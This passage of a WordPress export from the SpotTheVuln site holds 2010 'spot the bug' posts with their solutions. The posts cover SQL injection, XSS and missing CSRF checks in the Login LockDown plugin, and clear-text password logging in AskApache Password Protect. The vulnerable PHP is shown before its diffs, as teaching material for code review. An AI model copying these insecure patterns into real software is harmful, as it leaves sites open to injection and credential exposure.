		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ac01ffa878087c548f1f50077abeb028]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d0vOd6]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>479</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Widths &#8211; SQL Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/05/widths-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-05-28 08:05:10</wp:comment_date>
			<wp:comment_date_gmt>2010-05-28 15:05:10</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Widths [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Widths – SQL Injection</title>
		<link>http://spotthevuln.com/2010/05/widths-sql-injection/</link>
		<pubDate>Fri, 28 May 2010 15:00:52 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=868</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Login LockDown for Wordpress

Fixed in Version: 1.5

Issue Type: SQL Injection

Original Code: <a title="Widths" href="http://spotthevuln.com/2010/05/widths/" target="_blank">Found Here</a>
<h2>Description</h2>
This week’s code sample comes from the “Login Lockdown” plug-in for WordPress.  It’s always interesting when “security” software ends up having serious security flaws….

This patch contained several bug fixes.  The first bug fix we see in the patch is the inclusion of nonce checking to prevent CSRF.  It’s difficult to detect CSRF vulnerabilities by looking at individual function logic and it’s ok if the reader missed these bugs.  CSRF token validation should be done at the framework level and including CSRF nonce validation in the logic of every function can quickly become unwieldy.  If an application wide CSRF solution cannot be implemented at the framework level, then auditing for CSRF must be done at a function by function level.  Personally, I prefer to check for CSRF vulnerabilities by identifying any function that performs a Create, Update, or Delete operation, mapping those functions back to the HTML markup and checking the markup to see if a nonce is passed as part of the POST or GET request.  This is of course is done after an extensive audit of the nonce validation code.

The bugs that should have been spotted by the spotthevuln reader are the SQL injection and the XSS vulnerabilities in the code.  The SQL Injection is pretty straight forward.  The “releaseme” POST parameter is taken and is eventually passed directly to a dynamically built SQL statement without any sanitization.  The developers fixed the vulnerability by utilizing the WordPress escape logic.

Finally, the last line of the code snippet actually contained an XSS vulnerability, echoing a $_SERVER variable without any sanitization.
<h2>Developers Solution</h2>
[cce lang="diff"]

function print_loginlockdownAdminPage() {
        global $wpdb;
        $table_name = $wpdb-&gt;prefix . "lockdowns";
        $loginlockdownAdminOptions = get_loginlockdownOptions();

        if (isset($_POST['update_loginlockdownSettings'])) {

+  //wp_nonce check
+  check_admin_referer('login-lockdown_update-options');

                if (isset($_POST['ll_max_login_retries'])) {
                        $loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];
                }
                if (isset($_POST['ll_retries_within'])) {
                        $loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];
                }
                if (isset($_POST['ll_lockout_length'])) {
                        $loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];
                }
                if (isset($_POST['ll_lockout_invalid_usernames'])) {
                        $loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];
                }
                if (isset($_POST['ll_mask_login_errors'])) {
                        $loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];
                }
                update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);
                ?&gt;
&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Settings Updated.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;
                &lt;?php
        }
        if (isset($_POST['release_lockdowns'])) {

+  //wp_nonce check
+  check_admin_referer('login-lockdown_release-lockdowns');
               
  if (isset($_POST['releaseme'])) {
                        $released = $_POST['releaseme'];
                        foreach ( $released as $release_id ) {
                                $results = $wpdb-&gt;query("UPDATE $table_name SET release_date = now() " .
-                                                       "WHERE lockdown_ID = $release_id");
+                                                      "WHERE lockdown_ID = " . $wpdb-&gt;escape($release_id) . "");
                        }
                }
                update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);
                ?&gt;
&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Lockdowns Released.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;
                &lt;?php
        }
        $dalist = listLockedDown();
?&gt;
&lt;div&gt;
-&lt;form method="post" action="&lt;?php echo $_SERVER["REQUEST_URI"]; ?&gt;"&gt;
+&lt;form method="post" action="&lt;?php echo esc_attr($_SERVER["REQUEST_URI"]); ?&gt;"&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>868</wp:post_id>
		<wp:post_date>2010-05-28 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-05-28 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>widths-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="bug-fixes"><![CDATA[bug fixes]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="csrf"><![CDATA[CSRF]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="framework-level"><![CDATA[framework level]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="inclusion"><![CDATA[inclusion]]></category>
		<category domain="post_tag" nicename="logic"><![CDATA[logic]]></category>
		<category domain="post_tag" nicename="nonce"><![CDATA[nonce]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="sanitization"><![CDATA[sanitization]]></category>
		<category domain="post_tag" nicename="security-flaws"><![CDATA[security flaws]]></category>
		<category domain="post_tag" nicename="security-software"><![CDATA[security software]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="post_tag" nicename="token-validation"><![CDATA[token validation]]></category>
		<category domain="post_tag" nicename="type-sql"><![CDATA[type sql]]></category>
		<category domain="post_tag" nicename="validation-code"><![CDATA[validation code]]></category>
		<category domain="post_tag" nicename="vulnerabilities"><![CDATA[vulnerabilities]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/b9LTd0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e0c8845107f87359b4b1d7af053b11db]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Learning</title>
		<link>http://spotthevuln.com/2010/05/learning/</link>
		<pubDate>Mon, 31 May 2010 15:30:08 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=871</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>That is what learning is. You suddenly understand something you've understood all your life, but in a new way.
- Doris Lessig</strong></blockquote>
[ccnLe_php]&lt;?php

// aa_pp_hashit
//-------------------------------------------------------------------------------------------
function aa_pp_hashit($format,$user='',$pass=''){
        global $aa_PP;
    aa_pp_mess('Created '.$format.' Hash for '.$user.' with Password '.$pass);
    $hash='';
    switch ($format){
        case 'TEST':
                $hash=array();
                foreach($aa_PP['algorithms'] as $key=&gt;$value)$hash[]=aa_pp_hashit($key,"test{$key}","test{$key}");
        return $hash;
        break;
        case 'PLAIN':
        $hash=$user.':'.$pass;
        break;
        case 'CRYPT':
        $seed = NULL;
        for ($i = 0; $i &lt; 8; $i++) {$seed .= substr('0123456789abcdef', rand(0,15), 1);}
        $hash=$user.':'.crypt($pass, "$1$".$seed);
        break;
        case 'SHA1':
        $hash=$user.':{SHA}'.base64_encode(pack("H*", sha1($pass)));
        break;
        case 'MD5': // php.net/crypt.php#73619
        $saltt = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8);
        $len = strlen($pass);$text = $pass.'$apr1$'.$saltt;$bin = pack("H32", md5($pass.$saltt.$pass));
        for($i = $len; $i &gt; 0; $i -= 16) { $text .= substr($bin, 0, min(16, $i)); }
        for($i = $len; $i &gt; 0; $i &gt;&gt;= 1) { $text .= ($i &amp; 1) ? chr(0) : $pass{0}; }
        $bin = pack("H32", md5($text));
        for($i=0; $i&lt;1000; $i++) { $new = ($i &amp; 1) ? $pass : $bin; if ($i % 3) $new .= $saltt; if ($i % 7) $new .= $pass;

$new .= ($i &amp; 1) ? $bin : $pass; $bin = pack("H32", md5($new)); }
        for($i=0; $i&lt;5; $i++) { $k = $i + 6; $j=$i + 12; if($j==16){ $j = 5; } $TRp = $bin[$i].$bin[$k].$bin[$j].$TRp; }
        $TRp = chr(0).chr(0).$bin[11].$TRp;
        $TRp = strtr(strrev(substr(base64_encode($TRp),

2)),"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        $hash="$user:$"."apr1"."$".$saltt."$".$TRp;
        break;
    }

    return $hash;
}//============================================================================================
// aa_pp_show_encryptions
//-------------------------------------------------------------------------------------------
function aa_pp_show_encryptions($label,$type=0){
    global $aa_PP;
  
    if($type==0)
        {
        ?&gt;
        &lt;p&gt;&lt;label&gt;&lt;?php _e($label); ?&gt;&lt;br /&gt;
        &lt;select name="aapassformat" id="aapassformat"&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;option value="&lt;?php echo $key;?&gt;"&lt;?php if($aa_PP['format']==$key)echo ' selected="selected"';elseif

($aa_PP['algorithms'][$key]['enabled']!='1')echo ' disabled="disabled"';?&gt;&gt;&lt;?php echo $key;?&gt;   &lt;/option&gt;
        &lt;?php }?&gt;
        &lt;/select&gt;
        &lt;/label&gt;&lt;/p&gt;
     &lt;?php
     }
         elseif($type==3)
         {
     ?&gt;
        &lt;p&gt;&lt;label&gt;&lt;?php _e($label); ?&gt;&lt;br /&gt;
        &lt;input id="aapassformat" name="aapassformat" type="hidden" value="&lt;?php echo $aa_PP['format']; ?&gt;" /&gt;&lt;/label&gt;&lt;/p&gt;
        &lt;ul&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;li&gt;&lt;label&gt;&lt;input name="aapassformat" id="aapassformat&lt;?php echo strtolower($key);?&gt;"

type="radio" value="&lt;?php echo $key;?&gt;" &lt;?php if($aa_PP['format']==$key)echo 'checked="checked"';
                elseif($aa_PP['algorithms'][$key]['enabled']!='1')echo 'disabled="disabled"'; ?&gt; /&gt; &lt;strong&gt;&lt;?php echo

$key;?&gt;&lt;/strong&gt; -
            &lt;?php echo $aa_PP['algorithms'][$key]['desc'];?&gt;&lt;/label&gt;&lt;/li&gt;
        &lt;?php }?&gt;
        &lt;/ul&gt;
    &lt;?php
    }
    else if($type==4)
        {
     ?&gt;
        &lt;h4&gt;&lt;?php _e($label); ?&gt;&lt;/h4&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;p&gt;&lt;strong&gt;&lt;?php echo $key;?&gt;&lt;/strong&gt; - &lt;?php echo $aa_PP['algorithms'][$key]['desc'];?&gt;&lt;/p&gt;
        &lt;?php }?&gt;
        &lt;hr style="visibility:hidden;padding-top:.25em;clear:both;" /&gt;
    &lt;?php
    }
}//============================================================================================

// aa_pp_mess
//-------------------------------------------------------------------------------------------
function aa_pp_mess($message=''){
        if(@defined('AA_PP_DEBUG_LOGFILE'))error_log($message, 3, AA_PP_DEBUG_LOGFILE);
        else error_log($message);
    if(AA_PP_DEBUG){ ?&gt; &lt;div id="message" style="margin:1em auto;"&gt;&lt;p&gt;&lt;?php echo $message;?&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php }
}//============================================================================================ 

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>871</wp:post_id>
		<wp:post_date>2010-05-31 08:30:08</wp:post_date>
		<wp:post_date_gmt>2010-05-31 15:30:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>learning</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Learning]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Learning]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e0f5440817df0fc02957a6acf5036a53]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9NyszQ]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>483</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Learning &#8211; Insecure Logging (Defense in Depth) ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/06/learning-insecure-logging-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-06-04 08:12:57</wp:comment_date>
			<wp:comment_date_gmt>2010-06-04 15:12:57</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Learning [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Learning - Insecure Logging (Defense in Depth)</title>
		<link>http://spotthevuln.com/2010/06/learning-insecure-logging-defense-in-depth/</link>
		<pubDate>Fri, 04 Jun 2010 15:00:44 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=879</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: AskApache Password Protect

Fixed in Version: 4.3.2

Issue Type: Insecure Logging (Defense in Depth)

Original Code: <a title="Learning" href="http://spotthevuln.com/2010/05/learning/" target="_blank">Found Here</a>
<h2>Description</h2>
This week’s bug was discovered in the AskApache Password Protect plugin for WordPress.  Once again, we are examining “security software” that is designed to provide various security protection mechanisms for a deployed WordPress blog.  The description for the AskApache security plug-in is as follows:
<blockquote><em>Advanced Security: Password Protection, Anti-Spam, Anti-Exploits, more to come</em></blockquote>
A very noble effort indeed :)

This vulnerability was in the aa_pp_hashit() function. The aa_pp_hashit() function takes three arguments: $format, $user, and $pass.  The aa_pp_hashit() function then attempts to create a hash containing the creds.  Whenever I see functions utilizing crypto, I’m always reminded of this <a title="Mundane Detail" href="http://spotthevuln.com/wordpress/wp-content/uploads/2010/05/mundanedetail.wav" target="_blank">scene in Office Space</a> .  In this particular patch, vulnerability was in this line:
<blockquote>aa_pp_mess('Created '.$format.' Hash for '.$user.' <span style="color: #ff0000;">with Password '.$pass</span>);</blockquote>
The aa_pp_mess() function actually logged the clear text username and password before putting it through a hashing function.  There is rarely a need to log a clear text password… in fact, I’m going to go out on a limb here and say there is NEVER a good time when you should log a clear text password.  Even password hashes or other weird representations of passwords shouldn’t be logged.  Logging sensitive data is always tricky.  If you’re logging sensitive data please consider the permissions required to access that sensitive data, ensure the file is properly ACL’d and conduct regular audits of log file access.  Most importantly, ask yourself:  Why do I need to log this data?

The vulnerability was fixed by removing references to user password (and even references to the user that called the function).  Now I just have to figure out why the AskApache devs are passing a default value for $pass :)
<h2>Developers Solution</h2>
[cce lang="diff"]

// aa_pp_hashit
//-------------------------------------------------------------------------------------------
function aa_pp_hashit($format,$user='',$pass=''){
        global $aa_PP;
-   aa_pp_mess('Created '.$format.' Hash for '.$user.' with Password '.$pass);
+   aa_pp_mess('Created '.$format.' Hash');
    $hash='';
    switch ($format){
        case 'TEST':
                $hash=array();
                foreach($aa_PP['algorithms'] as $key=&gt;$value)$hash[]=aa_pp_hashit($key,"test{$key}","test{$key}");
        return $hash;
        break;
        case 'PLAIN':
        $hash=$user.':'.$pass;
        break;
        case 'CRYPT':
        $seed = NULL;
        for ($i = 0; $i &lt; 8; $i++) {$seed .= substr('0123456789abcdef', rand(0,15), 1);}
        $hash=$user.':'.crypt($pass, "$1$".$seed);
        break;
        case 'SHA1':
        $hash=$user.':{SHA}'.base64_encode(pack("H*", sha1($pass)));
        break;
        case 'MD5': // php.net/crypt.php#73619
        $saltt = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8);
        $len = strlen($pass);$text = $pass.'$apr1$'.$saltt;$bin = pack("H32", md5($pass.$saltt.$pass));
        for($i = $len; $i &gt; 0; $i -= 16) { $text .= substr($bin, 0, min(16, $i)); }
        for($i = $len; $i &gt; 0; $i &gt;&gt;= 1) { $text .= ($i &amp; 1) ? chr(0) : $pass{0}; }
        $bin = pack("H32", md5($text));
        for($i=0; $i&lt;1000; $i++) { $new = ($i &amp; 1) ? $pass : $bin; if ($i % 3) $new .= $saltt; if ($i % 7) $new .= $pass; $new .= ($i &amp; 1) ? $bin : $pass; $bin = pack("H32", md5($new)); }
        for($i=0; $i&lt;5; $i++) { $k = $i + 6; $j=$i + 12; if($j==16){ $j = 5; } $TRp = $bin[$i].$bin[$k].$bin[$j].$TRp; }
        $TRp = chr(0).chr(0).$bin[11].$TRp;
        $TRp = strtr(strrev(substr(base64_encode($TRp), 2)),"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        $hash="$user:$"."apr1"."$".$saltt."$".$TRp;
        break;
    }

    return $hash;
}//=========================================================================================================================
// aa_pp_show_encryptions
//-------------------------------------------------------------------------------------------
function aa_pp_show_encryptions($label,$type=0){
    global $aa_PP;
  
    if($type==0)
        {
        ?&gt;
        &lt;p&gt;&lt;label&gt;&lt;?php _e($label); ?&gt;&lt;br /&gt;
        &lt;select name="aapassformat" id="aapassformat"&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;option value="&lt;?php echo $key;?&gt;"&lt;?php if($aa_PP['format']==$key)echo ' selected="selected"';elseif($aa_PP['algorithms'][$key]['enabled']!='1')echo ' disabled="disabled"';?&gt;&gt;&lt;?php echo $key;?&gt;   &lt;/option&gt;
        &lt;?php }?&gt;
        &lt;/select&gt;
        &lt;/label&gt;&lt;/p&gt;
     &lt;?php
     }
         elseif($type==3)
         {
     ?&gt;
        &lt;p&gt;&lt;label&gt;&lt;?php _e($label); ?&gt;&lt;br /&gt;
        &lt;input id="aapassformat" name="aapassformat" type="hidden" value="&lt;?php echo $aa_PP['format']; ?&gt;" /&gt;&lt;/label&gt;&lt;/p&gt;
        &lt;ul&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;li&gt;&lt;label&gt;&lt;input name="aapassformat" id="aapassformat&lt;?php echo strtolower($key);?&gt;" type="radio" value="&lt;?php echo $key;?&gt;" &lt;?php if($aa_PP['format']==$key)echo 'checked="checked"';
                elseif($aa_PP['algorithms'][$key]['enabled']!='1')echo 'disabled="disabled"'; ?&gt; /&gt; &lt;strong&gt;&lt;?php echo $key;?&gt;&lt;/strong&gt; -
            &lt;?php echo $aa_PP['algorithms'][$key]['desc'];?&gt;&lt;/label&gt;&lt;/li&gt;
        &lt;?php }?&gt;
        &lt;/ul&gt;
    &lt;?php
    }
    else if($type==4)
        {
     ?&gt;
        &lt;h4&gt;&lt;?php _e($label); ?&gt;&lt;/h4&gt;
        &lt;?php foreach($aa_PP['algorithms'] as $key=&gt;$value){?&gt;
                &lt;p&gt;&lt;strong&gt;&lt;?php echo $key;?&gt;&lt;/strong&gt; - &lt;?php echo $aa_PP['algorithms'][$key]['desc'];?&gt;&lt;/p&gt;
        &lt;?php }?&gt;
        &lt;hr style="visibility:hidden;padding-top:.25em;clear:both;" /&gt;
    &lt;?php
    }
}//=========================================================================================================================

// aa_pp_mess
//-------------------------------------------------------------------------------------------
function aa_pp_mess($message=''){
        if(@defined('AA_PP_DEBUG_LOGFILE'))error_log($message, 3, AA_PP_DEBUG_LOGFILE);
-        else error_log($message);
+  else if(AA_PP_DEBUG)error_log($message)
    if(AA_PP_DEBUG){ ?&gt; &lt;div id="message" style="margin:1em auto;"&gt;&lt;p&gt;&lt;?php echo $message;?&gt;&lt;/p&gt;&lt;/div&gt; &lt;?php }
}//=========================================================================================================================
 

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>879</wp:post_id>
		<wp:post_date>2010-06-04 08:00:44</wp:post_date>
		<wp:post_date_gmt>2010-06-04 15:00:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>learning-insecure-logging-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="apache"><![CDATA[Apache]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="post_tag" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="post_tag" nicename="hash"><![CDATA[hash]]></category>
		<category domain="post_tag" nicename="hashing-function"><![CDATA[hashing function]]></category>
		<category domain="post_tag" nicename="information-disclosure"><![CDATA[information disclosure]]></category>
		<category domain="post_tag" nicename="password-protection"><![CDATA[password protection]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="post_tag" nicename="protection-mechanisms"><![CDATA[protection mechanisms]]></category>
		<category domain="post_tag" nicename="security-flaws"><![CDATA[security flaws]]></category>
		<category domain="post_tag" nicename="security-software"><![CDATA[security software]]></category>
		<category domain="post_tag" nicename="sensitive-data"><![CDATA[sensitive data]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
